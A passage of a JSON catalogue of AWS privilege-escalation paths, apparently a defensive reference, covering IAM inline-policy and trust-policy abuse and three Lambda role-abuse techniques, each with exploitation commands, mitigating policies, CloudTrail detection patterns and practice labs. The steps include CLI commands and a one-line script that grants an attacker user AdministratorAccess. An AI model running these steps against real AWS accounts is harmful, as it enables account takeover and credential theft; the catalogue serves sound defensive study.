    "recommendation": "Restrict `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` using the principle of least privilege. These permissions should rarely be granted together on the same target role, as this combination creates a direct privilege escalation path.\n\n**Prevention strategies:**\n\n1. Restrict `iam:PutRolePolicy` to prevent inline policy modification on sensitive roles:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PutRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/non-sensitive-prefix-*\",\n  \"Condition\": {\n    \"StringNotLike\": {\n      \"iam:RoleName\": [\"admin-*\", \"privileged-*\"]\n    }\n  }\n}\n```\n\n2. Restrict `iam:UpdateAssumeRolePolicy` to prevent trust policy modification on sensitive roles:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:UpdateAssumeRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/non-sensitive-prefix-*\",\n  \"Condition\": {\n    \"StringNotLike\": {\n      \"iam:RoleName\": [\"admin-*\", \"privileged-*\"]\n    }\n  }\n}\n```\n\n3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if administrative inline policies are added\n\n4. Separate the permissions - avoid granting both `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` to the same principal for the same target roles\n\n5. Require MFA for sensitive trust policy modifications and inline policy operations\n\n6. Implement regular audits of role trust policies and inline policies, as both can be less visible than managed policies in standard IAM reviews\n\n7. Use Service Control Policies (SCPs) to prevent the addition of overly permissive inline policies or trust policy modifications on critical roles\n\n8. Implement deny policies that explicitly block modification of trust policies or inline policies on administrative or critical roles\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `PutRolePolicy` API calls with policy documents containing broad permissions (e.g., `\"Action\": \"*\"` or `\"Action\": \"iam:*\"`)\n- `UpdateAssumeRolePolicy` API calls that add new principals to trust policies\n- Sequential occurrences of `PutRolePolicy` followed by `UpdateAssumeRolePolicy` on the same role within a short time window\n- `AssumeRole` API calls immediately following `UpdateAssumeRolePolicy` events\n- Trust policy modifications that add specific principal ARNs (as opposed to service principals like `ec2.amazonaws.com`)\n\nSet up CloudWatch alarms for unexpected changes to role trust policies and inline role policies. Investigate any trust policy modifications combined with inline policy additions. Consider implementing automated responses to roll back suspicious changes to critical role trust policies or inline policies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2018"
    },
    "references": [],
    "relatedPaths": [
      "iam-007",
      "iam-014",
      "iam-015",
      "iam-018"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L111-L115",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L345-L360",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L87-L92"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "ruleId": "TBD",
        "url": "https://docs.datadoghq.com/security/default_rules/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-putrolepolicy+iam-updateassumerolepolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-PutRolePolicy (privesc12) and IAM-UpdatingAssumeRolePolicy (privesc14)",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputrolepolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:PutRolePolicy and iam:UpdateAssumeRolePolicy permissions on a target role. Can be an IAM user or role.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "An existing IAM role that will be modified. The attacker will add an inline policy with administrative permissions and update its trust policy.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "After adding an inline policy with administrative permissions and assuming the role, the attacker gains full administrative access.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the inline policy grants elevated but non-administrative permissions, the attacker gains partial privilege escalation after assuming the role.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the inline policy only grants minimal permissions, the privilege escalation may not provide meaningful additional access.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "iam:PutRolePolicy + iam:UpdateAssumeRolePolicy + sts:AssumeRole",
          "description": "The attacker first adds an inline policy with administrative permissions to the target role, then updates the role's trust policy to allow their principal to assume it, and finally assumes the role. No prior sts:AssumeRole permission is needed - the trust policy grants this capability.\n\nCommands:\n```bash\n# Step 1: Add inline policy\naws iam put-role-policy \\\n  --role-name target-role \\\n  --policy-name AdminEscalation \\\n  --policy-document file://admin-policy.json\n\n# Step 2: Update trust policy\naws iam update-assume-role-policy \\\n  --role-name target-role \\\n  --policy-document file://trust-policy.json\n\n# Step 3: Assume the role\naws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/target-role \\\n  --role-session-name privesc-session\n```\n"
        },
        {
          "from": "target_role",
          "to": "admin_outcome",
          "label": "If admin inline policy added",
          "branch": "A",
          "condition": "admin",
          "description": "If the inline policy grants administrative permissions, the attacker gains full administrative access.\n"
        },
        {
          "from": "target_role",
          "to": "partial_outcome",
          "label": "If elevated inline policy added",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the inline policy grants elevated but non-administrative permissions, the attacker gains partial privilege escalation.\n"
        },
        {
          "from": "target_role",
          "to": "minimal_outcome",
          "label": "If limited inline policy added",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the inline policy only grants minimal permissions, the attacker may not gain meaningful additional access.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-10T13:36:26Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-021.yaml"
  },
  {
    "id": "lambda-001",
    "name": "iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction",
    "category": "service-passrole",
    "services": [
      "iam",
      "lambda"
    ],
    "description": "A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` can create a new Lambda function and attach an existing IAM Role to it. When the function is invoked, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts lambda.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A role must exist that trusts lambda.amazonaws.com to assume it"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws lambda create-function --function-name privesc-function --runtime python3.9 --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" --handler index.handler --zip-file fileb://exploit.zip",
          "description": "Create a Lambda function with the privileged role and malicious code"
        },
        {
          "step": 2,
          "command": "aws lambda invoke --function-name privesc-function output.txt",
          "description": "Invoke the function to execute code with elevated privileges"
        },
        {
          "step": 3,
          "command": "cat output.txt",
          "description": "View the output containing credentials or results of privileged API calls"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run lambda__backdoor_new_roles --role PRIVILEGED_ROLE",
          "description": "Use Pacu to create a backdoored Lambda function with the target role"
        },
        {
          "step": 2,
          "command": "run lambda__invoke --function-name privesc-function",
          "description": "Invoke the function to retrieve credentials"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"`iam:PassRole`\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"`iam:PassedToService`\": \"lambda.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditionally, restrict Lambda function creation and invocation:\n- Limit `lambda:CreateFunction` to specific function name patterns\n- Require resource-based policies on Lambda functions\n- Monitor CloudTrail for unusual Lambda function creation followed by immediate invocation\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - PassExistingRoleToNewLambdaThenInvoke",
        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc15-PassExistingRoleToNewLambdaThenInvoke.tf"
      }
    ],
    "relatedPaths": [
      "ec2-001",
      "cloudformation-001"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L152-L156",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L531",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L37-L41"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+lambda-createfunction+lambda-invokefunction",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "Lambda-PassExistingRoleToNewLambdaThenInvoke",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "lambda_privesc",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS Lambda privilege escalation"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS Lambda security labs",
        "scenario": "https://cybr.com/courses/aws-lambda-security-labs/",
        "scenarioPricingModel": "paid"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "lambda:CreateFunction",
          "resourceConstraints": "Must have permission to create Lambda functions"
        },
        {
          "permission": "lambda:InvokeFunction",
          "resourceConstraints": "Must have permission to invoke Lambda functions"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:InvokeFunction` permissions. This principal will create a Lambda function with a privileged role attached and invoke it to gain elevated privileges.\n"
        },
        {
          "id": "lambda_function",
          "label": "New Lambda Function",
          "type": "resource",
          "description": "The newly created Lambda function with malicious code. The function is created with `lambda:CreateFunction` and configured to use a privileged IAM role via `iam:PassRole`. The function code is designed to exfiltrate credentials or perform privileged actions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the lambda Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Lambda function during creation. This role must trust lambda.amazonaws.com as a principal in its trust policy. When the Lambda function is invoked, it executes with this role's permissions.\n"
        },
        {
          "id": "exfiltrate",
          "label": "Exfiltrate credentials",
          "type": "action",
          "color": "#99ccff",
          "description": "The Lambda function code executes with the target role's permissions. The function can either return the temporary credentials directly in the response, or use the role's permissions to perform privileged API calls (create access keys, modify policies, etc.).\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account by using the credentials or results from the Lambda function execution.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB) or the ability to pursue additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions, the privilege escalation may not provide meaningful additional access to the attacker.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "lambda_function",
          "label": "iam:PassRole + lambda:CreateFunction",
          "description": "The attacker creates a new Lambda function and passes a privileged role to it. The function is created with malicious code (typically in a ZIP file) that will execute when invoked.\n\nCommand:\n```bash\naws lambda create-function \\\n  --function-name privesc-function \\\n  --runtime python3.9 \\\n  --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --handler index.handler \\\n  --zip-file fileb://exploit.zip\n```\n\nThe exploit.zip contains code to exfiltrate credentials or perform privileged actions.\n"
        },
        {
          "from": "lambda_function",
          "to": "target_role",
          "label": "Function assumes role",
          "description": "When the Lambda function is invoked, the Lambda service automatically assumes the target role on behalf of the function. The function code then executes with all the permissions granted to this role.\n"
        },
        {
          "from": "target_role",
          "to": "exfiltrate",
          "label": "lambda:InvokeFunction",
          "description": "The attacker invokes the Lambda function, which executes the malicious code with the target role's permissions. The function can retrieve its own credentials via the AWS SDK or IMDSv2, or directly perform privileged API calls.\n\nCommand:\n```bash\naws lambda invoke \\\n  --function-name privesc-function \\\n  output.txt\n```\n\nThe output.txt file contains the function's response, which may include credentials or results of privileged operations.\n"
        },
        {
          "from": "exfiltrate",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. They can use the exfiltrated credentials to perform any action in the account.\n"
        },
        {
          "from": "exfiltrate",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables) or permissions that enable additional privilege escalation techniques.\n"
        },
        {
          "from": "exfiltrate",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. However, even limited access could be useful for reconnaissance or as part of a multi-step attack chain.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/lambda/lambda-001.yaml"
  },
  {
    "id": "lambda-002",
    "name": "iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping",
    "category": "service-passrole",
    "services": [
      "iam",
      "lambda"
    ],
    "description": "A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` can create a Lambda function with a privileged role and configure it to be automatically triggered by an event source (such as DynamoDB streams, Kinesis, or SQS). This allows the attacker to execute code with elevated privileges without manually invoking the function.",
    "prerequisites": {
      "admin": [
        "A role must exist that trusts lambda.amazonaws.com to assume it",
        "The role must have administrative permissions (e.g., AdministratorAccess)",
        "An event source must exist (DynamoDB stream, Kinesis stream, or SQS queue)"
      ],
      "lateral": [
        "A role must exist that trusts lambda.amazonaws.com to assume it",
        "An event source must exist (DynamoDB stream, Kinesis stream, or SQS queue)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws lambda create-function --function-name privesc-triggered \\\n  --runtime python3.9 --role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --handler index.handler --zip-file fileb://exploit.zip\n",
          "description": "Create a Lambda function with the privileged role"
        },
        {
          "step": 2,
          "command": "aws lambda create-event-source-mapping --function-name privesc-triggered \\\n  --event-source-arn arn:aws:dynamodb:REGION:ACCOUNT_ID:table/TABLE_NAME/stream/STREAM_ID \\\n  --starting-position LATEST\n",
          "description": "Configure the function to be triggered automatically by an event source"
        },
        {
          "step": 3,
          "command": "aws dynamodb put-item --table-name TABLE_NAME --item '{\"id\":{\"S\":\"trigger\"}}'",
          "description": "Trigger the function by adding an item to the DynamoDB table"
        }
      ]
    },
    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"lambda.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `lambda:CreateEventSourceMapping` permissions\n- Monitor CloudTrail for Lambda function creation with event source mappings\n- Alert on Lambda functions with privileged roles being created\n- Implement resource-based policies on event sources\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - Lambda PassRole with Trigger",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "lambda-001",
      "lambda-003"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L156-L160",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L645",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L40-L44"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-passrole+lambda-createfunction+createeventsourcemapping-dynamodb",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "Lambda-PassRoleToNewLambdaThenTrigger",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "lambda_privesc",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks"
      }
    },
    "toolSupport": {
      "pmapper": true,
      "iamVulnerable": true
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PassRole",
          "resourceConstraints": "Target role ARN must be in the Resource section"
        },
        {
          "permission": "lambda:CreateFunction",
          "resourceConstraints": "Must have permission to create Lambda functions"
        },
        {
          "permission": "lambda:CreateEventSourceMapping",
          "resourceConstraints": "Must have permission to create event source mappings"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to pass"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        },
        {
          "permission": "dynamodb:PutItem",
          "resourceConstraints": "Depending on what event source you configured, you might need permission to trigger it. We're using dynamodb:PutItem here only as an example. Ideally you will create an event source for something that is already happening so that you don't have to do anything manually."
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` permissions. This principal will create a Lambda function with a privileged role attached and configure it to be automatically triggered by an event source.\n"
        },
        {
          "id": "lambda_function",
          "label": "New Lambda Function",
          "type": "resource",
          "description": "The newly created Lambda function with malicious code. The function is created with `lambda:CreateFunction` and configured to use a privileged IAM role via `iam:PassRole`. Unlike lambda-001, this function does not require manual invocation - it will be automatically triggered by configured event sources.\n"
        },
        {
          "id": "event_source",
          "label": "Event Source Mapping",
          "type": "resource",
          "description": "An event source mapping configured with `lambda:CreateEventSourceMapping` that automatically triggers the Lambda function. Common event sources include DynamoDB streams, Kinesis streams, or SQS queues. When events occur in the source, the Lambda function is automatically invoked with the target role's permissions.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role That Trusts the lambda Service",
          "type": "resource",
          "description": "The privileged IAM role that is passed to the Lambda function during creation. This role must trust lambda.amazonaws.com as a principal in its trust policy. When the Lambda function is automatically triggered by events, it executes with this role's permissions without requiring manual invocation.\n"
        },
        {
          "id": "exfiltrate",
          "label": "Exfiltrate credentials",
          "type": "action",
          "color": "#99ccff",
          "description": "When the event source triggers the Lambda function, the function code executes with the target role's permissions. The function can exfiltrate the temporary credentials to an attacker-controlled server, or directly perform privileged API calls using the role's permissions. The automatic triggering nature means the attacker doesn't need lambda:InvokeFunction permission.\n"
        },
        {
          "id": "admin_outcome",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account when the function is automatically triggered. The credentials or privileged actions can be captured through the function's output or external exfiltration.\n"
        },
        {
          "id": "partial_outcome",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation when the function triggers. This could include access to sensitive data (S3, RDS, DynamoDB) or the ability to pursue additional escalation paths.\n"
        },
        {
          "id": "minimal_outcome",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If the target role only has minimal permissions or no interesting permissions, the automatic function execution may not provide meaningful additional access to the attacker, even when triggered by events.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "lambda_function",
          "label": "iam:PassRole + lambda:CreateFunction",
          "description": "The attacker creates a new Lambda function and passes a privileged role to it. The function is created with malicious code (typically in a ZIP file) that will execute when automatically triggered by events.\n\nCommand:\n```bash\naws lambda create-function \\\n  --function-name privesc-triggered \\\n  --runtime python3.9 \\\n  --role \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\" \\\n  --handler index.handler \\\n  --zip-file fileb://exploit.zip\n```\n\nThe exploit.zip contains code to exfiltrate credentials or perform privileged actions when triggered.\n"
        },
        {
          "from": "lambda_function",
          "to": "event_source",
          "label": "lambda:CreateEventSourceMapping",
          "description": "The attacker configures an event source mapping to automatically trigger the Lambda function. This connects the function to an existing event source like a DynamoDB stream, Kinesis stream, or SQS queue.\n\nCommand:\n```bash\naws lambda create-event-source-mapping \\\n  --function-name privesc-triggered \\\n  --event-source-arn arn:aws:dynamodb:REGION:ACCOUNT_ID:table/TABLE_NAME/stream/STREAM_ID \\\n  --starting-position LATEST\n```\n\nThis eliminates the need for lambda:InvokeFunction permission - the function executes automatically when events occur.\n"
        },
        {
          "from": "event_source",
          "to": "target_role",
          "label": "Event triggers function",
          "description": "When events occur in the configured source (e.g., items added to DynamoDB, messages in SQS, records in Kinesis), the Lambda service automatically invokes the function. The function executes with all the permissions granted to the target role, without requiring manual invocation by the attacker.\n"
        },
        {
          "from": "target_role",
          "to": "exfiltrate",
          "label": "Function executes with role permissions",
          "description": "The Lambda function code executes automatically with the target role's permissions when triggered by events. The malicious code can retrieve its own credentials via the AWS SDK or IMDSv2, send them to an attacker-controlled server, or directly perform privileged API calls using the role's permissions.\n"
        },
        {
          "from": "exfiltrate",
          "to": "admin_outcome",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account when the function triggers. They can use the exfiltrated credentials or the results of privileged operations to compromise the entire account.\n"
        },
        {
          "from": "exfiltrate",
          "to": "partial_outcome",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation when the function triggers. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables) or permissions that enable additional privilege escalation techniques.\n"
        },
        {
          "from": "exfiltrate",
          "to": "minimal_outcome",
          "label": "If role has minimal permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal or non-sensitive permissions, the automatic function execution may not yield meaningful additional access. However, even limited access could be useful for reconnaissance or as part of a multi-step attack chain. \n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/lambda/lambda-002.yaml"
  },
  {
    "id": "lambda-003",
    "name": "lambda:UpdateFunctionCode",
    "category": "access-resource",
    "services": [
      "lambda"
    ],
    "description": "A principal with `lambda:UpdateFunctionCode` can modify the code of an existing Lambda function that has a privileged execution role. By replacing the function code with malicious code, the attacker can execute arbitrary commands with the privileges of the function's execution role when the function is invoked. This is particularly effective against functions that are automatically triggered by events or regularly invoked.",
    "prerequisites": {
      "admin": [
        "A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)",
        "The function must be invokable either manually or via automatic triggers"
      ],
      "lateral": [
        "A Lambda function must exist with a privileged execution role",
        "The function must be invokable either manually or via automatic triggers"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "echo 'import boto3; iam = boto3.client(\"iam\"); iam.attach_user_policy(UserName=\"attacker\", PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\")' > lambda_function.py\n",
          "description": "Create malicious Lambda function code that escalates privileges"
        },
        {
          "step": 2,
          "command": "zip exploit.zip lambda_function.py",
          "description": "Package the malicious code into a deployment package"
        },
        {
          "step": 3,
          "command": "aws lambda update-function-code --function-name TARGET_FUNCTION \\\n  --zip-file fileb://exploit.zip\n",
          "description": "Update the target Lambda function with the malicious code"
        },
        {
          "step": 4,
          "command": "aws lambda invoke --function-name TARGET_FUNCTION output.txt",
          "description": "Invoke the function to execute the privilege escalation"
        }
      ]
    },
    "recommendation": "Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.\nUse resource-based policies to limit which functions can be modified:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"lambda:UpdateFunctionCode\",\n  \"Resource\": \"arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions\n- Implement Lambda function versioning and aliases to prevent direct modification\n- Use AWS Config rules to detect changes to Lambda function code\n- Require code signing for Lambda deployments\n- Alert on Lambda functions with privileged roles being modified\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - Lambda Update Function Code",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "lambda-001",
      "lambda-002"
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/lambda_edges.py#L152-L172",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L155",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L573-L577",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L94"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/lambda-updatefunctioncode",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "Lambda-EditExistingLambdaFunctionWithRole",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "permissions": {
      "required": [
        {
          "permission": "lambda:UpdateFunctionCode",
          "resourceConstraints": "Must have permission to update the target Lambda function's code"
        }
      ]
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The starting principal (user or role) with `lambda:UpdateFunctionCode` permission. This principal will modify the code of an existing Lambda function that has a privileged execution role, replacing it with malicious code to gain elevated privileges.\n"
        },
        {
          "id": "lambda_function",
          "label": "Existing Lambda Function",
          "type": "resource",
          "description": "An existing Lambda function with a privileged IAM execution role. This function must be invokable either manually (if the attacker has `lambda:InvokeFunction` permission) or automatically via event triggers (EventBridge, S3, DynamoDB streams, etc.). The function's execution role determines the level of access the attacker will gain.\n"
        },
        {
          "id": "exfiltrate",
          "label": "Exfiltrate credentials",
          "type": "action",
          "color": "#99ccff",
